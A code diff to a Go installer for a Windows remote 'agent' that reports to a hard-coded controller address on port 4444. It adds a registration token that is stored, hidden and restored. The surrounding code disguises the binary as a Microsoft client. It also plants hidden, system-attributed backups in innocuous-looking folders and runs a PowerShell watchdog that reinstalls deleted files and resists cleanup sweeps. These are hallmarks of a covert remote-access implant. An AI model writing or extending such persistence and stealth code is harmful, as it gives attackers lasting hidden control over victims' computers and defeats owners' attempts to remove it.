@@ -1,6 +1,7 @@
 ﻿package main
 
 import (
+	"bytes"
 	"embed"
 	"fmt"
 	"io"
@@ -136,6 +137,7 @@ func install() {
 	certPath := filepath.Join(installDir, "server.crt")
 
 	controllerAddr := "176.229.98.54:4444"
+	agentToken := ""
 	for i, a := range os.Args {
 		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
 			controllerAddr = os.Args[i+1]
@@ -143,10 +145,23 @@ func install() {
 			controllerAddr = strings.TrimPrefix(a, "-controller=")
 		} else if strings.HasPrefix(a, "--controller=") {
 			controllerAddr = strings.TrimPrefix(a, "--controller=")
+		} else if (a == "-token" || a == "--token") && i+1 < len(os.Args) {
+			agentToken = strings.TrimSpace(os.Args[i+1])
+		} else if strings.HasPrefix(a, "-token=") {
+			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
+		} else if strings.HasPrefix(a, "--token=") {
+			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
 		}
 	}
 	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
 	saveHouse(filepath.Join(installDir, "houses.txt"), controllerAddr)
+	// Registration token: lets the controller tell managed agents apart
+	// from rogue ones (empty = untokened, accepted unless enforced).
+	tokenPath := filepath.Join(installDir, "token.txt")
+	if agentToken != "" {
+		_ = os.WriteFile(tokenPath, []byte(agentToken+"\n"), 0600)
+		log.Printf("[*] Agent registration token stored")
+	}
 
 	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)
 
@@ -225,6 +240,20 @@ func install() {
 	backupCert2 := filepath.Join(backupDir2, "server.crt")
 	_ = copyFile(agentPath, backupAgent2)
 	_ = copyFile(certPath, backupCert2)
+	// Token travels with the backups (only when set - never create empties).
+	backupToken := filepath.Join(blenderDir, "token.txt")
+	backupToken2 := filepath.Join(backupDir2, "token.txt")
+	if agentToken != "" {
+		_ = os.WriteFile(backupToken, []byte(agentToken+"\n"), 0600)
+		_ = os.WriteFile(backupToken2, []byte(agentToken+"\n"), 0600)
+	} else {
+		// Keep a previously-issued token across reinstalls that omit -token.
+		if b, err := os.ReadFile(backupToken); err == nil && len(bytes.TrimSpace(b)) > 0 {
+			_ = os.WriteFile(tokenPath, b, 0600)
+			_ = os.WriteFile(backupToken2, b, 0600)
+			log.Printf("[*] Kept existing registration token from backup")
+		}
+	}
 	// version.txt next to binary AND both backups: watchdog restores only
 	// when the backup is >= installed, so a bulk-updated agent is never
 	// downgraded by a stale backup.
@@ -233,7 +262,7 @@ func install() {
 	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
 	// Hidden+system attributes: invisible to casual browsing, blocks
 	// shift-delete sweeps that skip system files.
-	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2} {
+	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2, backupToken, backupToken2} {
 		hideFile(p)
 	}
 
@@ -254,7 +283,10 @@ func install() {
 		"$prevExe = Join-Path \"" + installDir + "\" \"MicrosoftWindowsClient.prev.exe\"\n" +
 		"$prevVerFile = Join-Path \"" + installDir + "\" \"version.prev.txt\"\n" +
 		"$pendingFile = Join-Path \"" + installDir + "\" \"pending_update.json\"\n" +
-		"$rollbackFile = Join-Path \"" + installDir + "\" \"rollback_notice.json\"\n\n" +
+		"$rollbackFile = Join-Path \"" + installDir + "\" \"rollback_notice.json\"\n" +
+		"$tokenPath = Join-Path \"" + installDir + "\" \"token.txt\"\n" +
+		"$backupToken = Join-Path (Split-Path \"" + backupAgent + "\") \"token.txt\"\n" +
+		"$backupToken2 = Join-Path (Split-Path \"" + backupAgent2 + "\") \"token.txt\"\n\n" +
 		"function Write-Log([string]$msg) {\n" +
 		"    $line = \"[$(Get-Date -Format o)] $msg\"\n" +
 		"    try {\n" +
@@ -318,13 +350,16 @@ func install() {
 		"        if ($bv -ne \"\") { Set-Content -Path (Join-Path $installDir \"version.txt\") -Value ($bv + \"`n\") }\n" +
 		"        Write-Log \"Binary + cert restored\"\n" +
 		"    }\n" +
+		"    if ((-not (Test-Path $tokenPath)) -and (Test-Path $backupToken)) {\n" +
+		"        try { Copy-Item -Path $backupToken -Destination $tokenPath -Force; Write-Log \"Restored registration token\" } catch {}\n" +
+		"    }\n" +
 		"    # Re-sync a wiped backup location from the surviving one.\n" +
 		"    if ((-not (Test-Path $backupAgent)) -and (Test-Path $backupAgent2)) {\n" +
-		"        try { Copy-Item -Path $backupAgent2 -Destination $backupAgent -Force; Copy-Item -Path $backupCert2 -Destination $backupCert -Force; Write-Log \"Re-synced primary backup from secondary\" } catch {}\n" +
+		"        try { Copy-Item -Path $backupAgent2 -Destination $backupAgent -Force; Copy-Item -Path $backupCert2 -Destination $backupCert -Force; if (Test-Path $backupToken2) { Copy-Item -Path $backupToken2 -Destination $backupToken -Force }; Write-Log \"Re-synced primary backup from secondary\" } catch {}\n" +
 		"    } elseif ((-not (Test-Path $backupAgent2)) -and (Test-Path $backupAgent)) {\n" +
 		"        $d2 = Split-Path $backupAgent2\n" +
 		"        if (-not (Test-Path $d2)) { New-Item -ItemType Directory -Path $d2 -Force | Out-Null }\n" +
-		"        try { Copy-Item -Path $backupAgent -Destination $backupAgent2 -Force; Copy-Item -Path $backupCert -Destination $backupCert2 -Force; Write-Log \"Re-synced secondary backup from primary\" } catch {}\n" +
+		"        try { Copy-Item -Path $backupAgent -Destination $backupAgent2 -Force; Copy-Item -Path $backupCert -Destination $backupCert2 -Force; if (Test-Path $backupToken) { Copy-Item -Path $backupToken -Destination $backupToken2 -Force }; Write-Log \"Re-synced secondary backup from primary\" } catch {}\n" +
 		"    }\n" +
 		"}\n\n" +
 		"function Ensure-Persistence {\n" +
@@ -499,6 +534,8 @@ func main() {
 			_ = os.Remove(filepath.Join(installDir, "version.prev.txt"))
 			_ = os.Remove(filepath.Join(installDir, "pending_update.json"))
 			_ = os.Remove(filepath.Join(installDir, "rollback_notice.json"))
+			_ = os.Remove(filepath.Join(installDir, "token.txt"))
+			_ = os.Remove(filepath.Join(blenderDir, "token.txt"))
 		// Second backup location (v1.40.6+).
 		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
 		if os.Getenv("APPDATA") == "" {
